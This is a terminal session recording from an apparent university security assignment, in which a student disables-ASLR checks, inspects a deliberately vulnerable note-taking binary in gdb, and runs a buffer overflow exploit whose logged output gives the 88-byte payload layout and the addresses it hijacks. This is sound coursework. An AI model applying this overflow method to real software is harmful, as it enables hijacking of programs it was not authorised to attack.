@@ -1,0 +1,151 @@
+Script started on 2026-04-05 23:41:14-06:00 [TERM="xterm-256color" TTY="/dev/pts/0" COLUMNS="120" LINES="30"]
+[?2004h]0;ubuntu@bof-vuln: ~/cmput333_assignment3/p2[01;32mubuntu@bof-vuln[00m:[01;34m~/cmput333_assignment3/p2[00m$ [7mcat /proc/sys/kernel/randomize_va_space[27mcat /proc/sys/kernel/randomize_va_space
+[?2004l0
+[?2004h]0;ubuntu@bof-vuln: ~/cmput333_assignment3/p2[01;32mubuntu@bof-vuln[00m:[01;34m~/cmput333_assignment3/p2[00m$ [7mfile ./vulnprog[27mfile ./vulnprog
+[?2004l./vulnprog: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=c9b67fddea45917020b65299682fc1e155459805, for GNU/Linux 3.2.0, stripped
+[?2004h]0;ubuntu@bof-vuln: ~/cmput333_assignment3/p2[01;32mubuntu@bof-vuln[00m:[01;34m~/cmput333_assignment3/p2[00m$ [7mgdb -batch -ex 'starti' -ex 'info proc mappings' ./vulnprog[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cgdb -batch -ex 'starti' -ex 'info proc mappings' ./vulnprog
+[?2004l
+Program stopped.
+0x00007ffff7fe4540 in _start () from /lib64/ld-linux-x86-64.so.2
+process 2600
+Mapped address spaces:
+
+          Start Addr           End Addr       Size     Offset  Perms  objfile
+      0x555555554000     0x555555555000     0x1000        0x0  r--p   /home/ubuntu/cmput333_assignment3/p2/vulnprog
+      0x555555555000     0x555555556000     0x1000     0x1000  r-xp   /home/ubuntu/cmput333_assignment3/p2/vulnprog
+      0x555555556000     0x555555557000     0x1000     0x2000  r--p   /home/ubuntu/cmput333_assignment3/p2/vulnprog
+      0x555555557000     0x555555559000     0x2000     0x2000  rw-p   /home/ubuntu/cmput333_assignment3/p2/vulnprog
+      0x7ffff7fbf000     0x7ffff7fc3000     0x4000        0x0  r--p   [vvar]
+      0x7ffff7fc3000     0x7ffff7fc5000     0x2000        0x0  r-xp   [vdso]
+      0x7ffff7fc5000     0x7ffff7fc6000     0x1000        0x0  r--p   /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
+      0x7ffff7fc6000     0x7ffff7ff1000    0x2b000     0x1000  r-xp   /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
+      0x7ffff7ff1000     0x7ffff7ffb000     0xa000    0x2c000  r--p   /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
+      0x7ffff7ffb000     0x7ffff7fff000     0x4000    0x36000  rw-p   /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
+      0x7ffffffde000     0x7ffffffff000    0x21000        0x0  rwxp   [stack]
+  0xffffffffff600000 0xffffffffff601000     0x1000        0x0  --xp   [vsyscall]
+[?2004h]0;ubuntu@bof-vuln: ~/cmput333_assignment3/p2[01;32mubuntu@bof-vuln[00m:[01;34m~/cmput333_assignment3/p2[00m$ [K]0;ubuntu@bof-vuln: ~/cmput333_assignment3/p2[01;32mubuntu@bof-vuln[00m:[01;34m~/cmput333_assignment3/p2[00m$ [7mgdb -batch -ex 'break main' -ex 'run' -ex 'print (void*)exit' ./vulnprog[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cgdb -batch -ex 'break main' -ex 'run' -ex 'print (void*)exit' ./vulnprog
+[?2004lFunction "main" not defined.
+Make breakpoint pending on future shared library load? (y or [n]) [answered N; input not from terminal]
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+Welcome to the secrets app
+There are 23 secret functions within, but let's talk about the weather instead.
+
+
+=== Note Taker ===
+1. Add note
+2. Edit note
+3. View note
+4. Quit
+Choice: 4
+[Inferior 1 (process 2616) exited normally]
+$1 = (void *) 0x7ffff7c47ba0 <__GI_exit>
+[?2004h]0;ubuntu@bof-vuln: ~/cmput333_assignment3/p2[01;32mubuntu@bof-vuln[00m:[01;34m~/cmput333_assignment3/p2[00m$ [7mgdb -batch -ex 'start' -ex 'print (void*)exit' ./vulnprog[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cgdb -batch -ex 'start' -ex 'print (void*)exit' ./vulnprog
+[?2004lFunction "main" not defined.
+Make breakpoint pending on future shared library load? (y or [n]) [answered N; input not from terminal]
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+Welcome to the secrets app
+There are 23 secret functions within, but let's talk about the weather instead.
+
+
+=== Note Taker ===
+1. Add note
+2. Edit note
+3. View note
+4. Quit
+Choice: 4
+[Inferior 1 (process 2624) exited normally]
+$1 = (void *) 0x7ffff7c47ba0 <__GI_exit>
+[?2004h]0;ubuntu@bof-vuln: ~/cmput333_assignment3/p2[01;32mubuntu@bof-vuln[00m:[01;34m~/cmput333_assignment3/p2[00m$ [7mexit[27m
+[7mexit[27m
+[A[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cexit
+exit
+[A
+[?2004lexit
+
+Script done on 2026-04-05 23:49:20-06:00 [COMMAND_EXIT_CODE="0"]
+Script started on 2026-04-05 23:53:02-06:00 [TERM="xterm-256color" TTY="/dev/pts/0" COLUMNS="210" LINES="57"]
+[?2004h]0;ubuntu@bof-vuln: ~/cmput333_assignment3/p2[01;32mubuntu@bof-vuln[00m:[01;34m~/cmput333_assignment3/p2[00m$ [7mcat /proc/sys/kernel/randomize_va_space[27mcat /proc/sys/kernel/randomize_va_space
+[?2004l0
+[?2004h]0;ubuntu@bof-vuln: ~/cmput333_assignment3/p2[01;32mubuntu@bof-vuln[00m:[01;34m~/cmput333_assignment3/p2[00m$ [7mgdb -batch -ex 'starti' -ex 'info proc mappings' ./vulnprog[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cgdb -batch -ex 'starti' -ex 'info proc mappings' ./vulnprog
+[?2004l
+Program stopped.
+0x00007ffff7fe4540 in _start () from /lib64/ld-linux-x86-64.so.2
+process 2658
+Mapped address spaces:
+
+          Start Addr           End Addr       Size     Offset  Perms  objfile
+      0x555555554000     0x555555555000     0x1000        0x0  r--p   /home/ubuntu/cmput333_assignment3/p2/vulnprog
+      0x555555555000     0x555555556000     0x1000     0x1000  r-xp   /home/ubuntu/cmput333_assignment3/p2/vulnprog
+      0x555555556000     0x555555557000     0x1000     0x2000  r--p   /home/ubuntu/cmput333_assignment3/p2/vulnprog
+      0x555555557000     0x555555559000     0x2000     0x2000  rw-p   /home/ubuntu/cmput333_assignment3/p2/vulnprog
+      0x7ffff7fbf000     0x7ffff7fc3000     0x4000        0x0  r--p   [vvar]
+      0x7ffff7fc3000     0x7ffff7fc5000     0x2000        0x0  r-xp   [vdso]
+      0x7ffff7fc5000     0x7ffff7fc6000     0x1000        0x0  r--p   /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
+      0x7ffff7fc6000     0x7ffff7ff1000    0x2b000     0x1000  r-xp   /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
+      0x7ffff7ff1000     0x7ffff7ffb000     0xa000    0x2c000  r--p   /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
+      0x7ffff7ffb000     0x7ffff7fff000     0x4000    0x36000  rw-p   /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
+      0x7ffffffde000     0x7ffffffff000    0x21000        0x0  rwxp   [stack]
+  0xffffffffff600000 0xffffffffff601000     0x1000        0x0  --xp   [vsyscall]
+[?2004h]0;ubuntu@bof-vuln: ~/cmput333_assignment3/p2[01;32mubuntu@bof-vuln[00m:[01;34m~/cmput333_assignment3/p2[00m$ [7mgdb -batch -ex 'break main' -ex 'run' -ex 'print (void*)exit' ./vulnprog[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cgdb -batch -ex 'break main' -ex 'run' -ex 'print (void*)exit' ./vulnprog
+[?2004lFunction "main" not defined.
+Make breakpoint pending on future shared library load? (y or [n]) [answered N; input not from terminal]
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+Welcome to the secrets app
+There are 23 secret functions within, but let's talk about the weather instead.
+
+
+=== Note Taker ===
+1. Add note
+2. Edit note
+3. View note
+4. Quit
+Choice: 4
+[Inferior 1 (process 2670) exited normally]
+$1 = (void *) 0x7ffff7c47ba0 <__GI_exit>
+[?2004h]0;ubuntu@bof-vuln: ~/cmput333_assignment3/p2[01;32mubuntu@bof-vuln[00m:[01;34m~/cmput333_assignment3/p2[00m$ [7mpython3 find_base.py[27mpython3 find_base.py
+[?2004l[*] Running gdb to find PIE base address...
+Traceback (most recent call last):
+  File "/home/ubuntu/cmput333_assignment3/p2/find_base.py", line 70, in <module>
+    main()
+  File "/home/ubuntu/cmput333_assignment3/p2/find_base.py", line 30, in main
+    result = subprocess.run(
+             ^^^^^^^^^^^^^^^
+  File "/usr/lib/python3.12/subprocess.py", line 550, in run
+    stdout, stderr = process.communicate(input, timeout=timeout)
+                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3.12/subprocess.py", line 1209, in communicate
+    stdout, stderr = self._communicate(input, endtime, timeout)
+                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3.12/subprocess.py", line 2116, in _communicate
+    self._check_timeout(endtime, orig_timeout, stdout, stderr)
+  File "/usr/lib/python3.12/subprocess.py", line 1253, in _check_timeout
+    raise TimeoutExpired(
+subprocess.TimeoutExpired: Command '['gdb', '-batch', '-x', '/tmp/gdb_find_base.gdb']' timed out after 30 seconds
+[?2004h]0;ubuntu@bof-vuln: ~/cmput333_assignment3/p2[01;32mubuntu@bof-vuln[00m:[01;34m~/cmput333_assignment3/p2[00m$ [7mpython3 exploit.py | ./vulnprog[27mpython3 exploit.py | ./vulnprog
+[?2004lWelcome to the secrets app
+There are 23 secret functions within, but let's talk about the weather instead.
+
+
+=== Note Taker ===
+1. Add note
+2. Edit note
+3. View note
+4. Quit
+Choice: [*] CMPUT 333 Assignment 3 — Buffer Overflow Exploit
+[*] Group number     : 9
+[*] PIE base         : 0x0000555555554000
+[*] Secret function  : 0x0000555555555319  (PIE+0x1319)
+[*] Exit function    : 0x00007ffff7c47ba0
+[*] Payload size     : 88 bytes (88 = 64 pad + 8 fake-rbp + 8 secret + 8 exit)
+[*] Expected output  : SECRET CMPUT 333 Group 09 reached
+Note index (0-2): Enter new note text: SECRET CMPUT 333 Group 09 reached
+[?2004h]0;ubuntu@bof-vuln: ~/cmput333_assignment3/p2[01;32mubuntu@bof-vuln[00m:[01;34m~/cmput333_assignment3/p2[00m$ [7mecho "Exit status: $?"[27mecho "Exit status: $?"
+[?2004lExit status: 16
+[?2004h]0;ubuntu@bof-vuln: ~/cmput333_assignment3/p2[01;32mubuntu@bof-vuln[00m:[01;34m~/cmput333_assignment3/p2[00m$ ^C[?2004l[?2004h[?2004l
+[?2004h]0;ubuntu@bof-vuln: ~/cmput333_assignment3/p2[01;32mubuntu@bof-vuln[00m:[01;34m~/cmput333_assignment3/p2[00m$ [7mexit[27mexit
+[?2004lexit
+
+Script done on 2026-04-06 00:06:21-06:00 [COMMAND_EXIT_CODE="130"]
